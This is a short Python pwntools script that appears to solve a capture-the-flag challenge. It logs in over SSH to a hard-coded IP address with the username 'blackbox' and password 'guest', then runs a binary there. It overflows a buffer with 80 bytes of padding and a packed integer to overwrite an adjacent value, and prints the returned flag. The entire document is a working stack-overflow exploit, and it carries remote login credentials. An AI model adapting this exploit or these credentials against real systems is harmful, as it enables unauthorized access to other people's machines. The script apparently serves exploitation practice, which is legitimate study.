from pwn import *

target = ssh(host='104.131.79.111', user='blackbox', password='guest', port=1001)

overflow = b"A"*80
num = p32(2)
overflow = overflow + num

io = target.process(['/home/blackbox/blackbox'])
io.sendline(overflow)
io.recv()

flag = io.recv()
success(flag)
